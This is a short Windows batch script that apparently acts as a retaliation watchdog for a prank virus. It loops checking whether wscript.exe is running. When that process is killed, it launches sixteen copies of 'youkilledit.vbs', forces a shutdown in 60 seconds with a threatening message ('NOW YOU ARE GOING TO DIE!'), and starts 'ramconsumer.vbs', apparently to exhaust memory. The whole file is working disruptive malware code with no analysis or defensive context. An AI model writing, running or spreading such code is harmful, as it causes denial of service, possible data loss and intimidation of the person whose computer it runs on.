@echo off
:start
tasklist /fi "ImageName eq wscript.exe" /fo csv 2>NUL | find /I "wscript.exe">NUL
if "%ERRORLEVEL%"=="1" (
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
start youkilledit.vbs
shutdown -s -t 60 /c "YOU KILLED MY VIRUS! NOW YOU ARE GOING TO DIE! DONT LOOK BEHIND YOU! IM HERE!"
timeout /t 4
start ramconsumer.vbs
goto end
)
goto start
:end
exit